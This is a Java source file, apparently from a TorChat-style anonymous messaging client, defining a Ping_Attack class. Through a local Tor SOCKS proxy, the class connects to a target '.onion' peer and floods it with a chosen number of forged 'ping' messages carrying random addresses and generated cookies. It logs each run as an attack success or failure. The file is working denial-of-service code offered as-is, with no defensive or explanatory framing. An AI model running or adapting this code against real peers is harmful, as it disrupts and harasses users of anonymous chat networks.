package special;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.util.Random;

import core.Buddy;
import core.Logger;

public class Ping_Attack extends Thread  {
	
	
public static void attack(String id, int count)
{
    try {
        Socket sock = new Socket(new Proxy(Proxy.Type.SOCKS, new InetSocketAddress("127.0.0.1", 11599)));
		sock.connect(InetSocketAddress.createUnresolved(id + ".onion", 11009));
        OutputStream os = sock.getOutputStream();
        for(int f=0;f<count;f++)
        {
        String list = "abcdefghijklmnopqrstuvwxyz1234567890";
        Random r = new Random();
        String addr = "";
        for (int i = 0 ; i < 16 ; i++)
            addr += list.charAt(r.nextInt(list.length()));
        os.write(("ping " + addr + Buddy.generateCookie()).getBytes());
        os.flush();
        }
		Logger.log(Logger.WARNING, "Ping_Attack", id + " attack success with "+count+".");
        sock.close();    
		} catch (IOException e) {
			Logger.log(Logger.WARNING, "Ping_Attack", id + " attack fail.");
			e.printStackTrace();
		}
}
	
}
